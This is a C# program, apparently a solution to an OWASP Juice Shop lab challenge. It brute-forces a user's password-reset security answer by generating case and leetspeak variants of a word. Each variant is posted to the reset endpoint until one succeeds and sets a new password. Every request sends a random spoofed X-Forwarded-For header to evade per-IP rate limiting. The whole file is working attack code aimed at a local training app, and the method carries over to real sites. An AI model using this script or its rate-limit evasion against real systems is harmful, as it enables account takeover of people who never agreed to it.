using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace LeetGenerator
{
    class Program
    {
        private static Dictionary<char, char> Leet = new Dictionary<char, char>()
        {
            { 'o', '0' },
            { 'i', '1' },
            { 'z', '2' },
            { 'e', '3' },
            { 'a', '4' },
            { 's', '5' },
            { 'g', '6' },
            { 't', '7' },
            { 'b', '8' },
            { 'l', '1' }
        };

        static async Task Main(string[] args)
        {
            
            if (args.Length != 1)
                throw new Exception("Unknown args! Only one arg possible");
            
            var input = args[0].ToLower();

            var charPossibilities = GetPossibilities(input);

            var output = ExpandInput(charPossibilities);

            var sw = new Stopwatch();
            sw.Start();
            foreach (var possibility in output)
            {
                var client = GetClient();

                var content = GetContent(possibility);
                
                var response = await client.PostAsync("/rest/user/reset-password", content);

                if (response.IsSuccessStatusCode)
                {
                    sw.Stop();
                    Console.WriteLine("The answer was {0}, and it was retrieved in {1}ms", possibility, sw.ElapsedMilliseconds);
                    return;
                }
            }
            sw.Stop();
            Console.WriteLine("No answer found in {0}ms", sw.ElapsedMilliseconds);
        }

        private static FormUrlEncodedContent GetContent(string answer)
        {
            var values = new Dictionary<string, string>()
            {
                { "answer", answer },
                { "email", "morty@juice-sh.op" },
                { "new", "test1234" },
                { "repeat", "test1234" }
            };
            return new FormUrlEncodedContent(values);
        }
        
        private static HttpClient GetClient()
        {
            var bytes = new byte[4];
            new Random().NextBytes(bytes);
            var address = new IPAddress(bytes);

            var client = new HttpClient()
            {
                BaseAddress = new Uri("http://localhost:3000"),
            };
            client.DefaultRequestHeaders.Add("X-Forwarded-For", address.ToString());
            client.DefaultRequestHeaders.Add("Pragma", "no-cache");
            client.DefaultRequestHeaders.Add("Origin", "http://localhost:3000");
            client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br");
            client.DefaultRequestHeaders.Add("Accept-Language", "en-GB,en;q=0.9,en-US;q=0.8,de;q=0.7");
            client.DefaultRequestHeaders.Add("Accept", "application/json");
            client.DefaultRequestHeaders.Add("Cache-Control", "no-cache");
            client.DefaultRequestHeaders.Add("Referer", "http://localhost:3000");
            client.DefaultRequestHeaders.Add("Connection", "keep-alive");
            return client;
        }

        private static List<string> ExpandInput(List<List<char>> charPossibilities)
        {
            var output = new List<string>();

            foreach (var currPossibility in charPossibilities)
            {
                if (output.Count == 0)
                {
                    foreach (var ch in currPossibility)
                    {
                        output.Add(ch.ToString());
                    }

                    continue;
                }

                var newWithPossibilityForThisChar = new List<string>();

                foreach (var ch in currPossibility)
                {
                    var newForThisInstance = new List<string>();
                    for (int i = 0; i < output.Count; i++)
                    {
                        var rightNow = output[i] + ch;
                        newForThisInstance.Add(rightNow);
                    }

                    newWithPossibilityForThisChar.AddRange(newForThisInstance);
                }

                output = newWithPossibilityForThisChar;
            }

            return output;
        }

        private static List<List<char>> GetPossibilities(string input)
        {
            var charPossibilities = new List<List<char>>();
            foreach (var letter in input)
            {
                var possibilities = new List<char>()
                {
                    letter, Char.ToUpper(letter)
                };

                if (Leet.ContainsKey(letter))
                    possibilities.Add(Leet[letter]);
                charPossibilities.Add(possibilities);
            }

            int total = 1;
            foreach (var poss in charPossibilities)
            {
                total *= poss.Count;
            }

            Console.WriteLine("There is {0} possibilities for word {1}", total, input);
            return charPossibilities;
        }
    }
}

class PayloadDto
{
    public string Email { get; set; }
    public string Answer { get; set; }
    public string New { get; set; }
    public string Repeat { get; set; }
}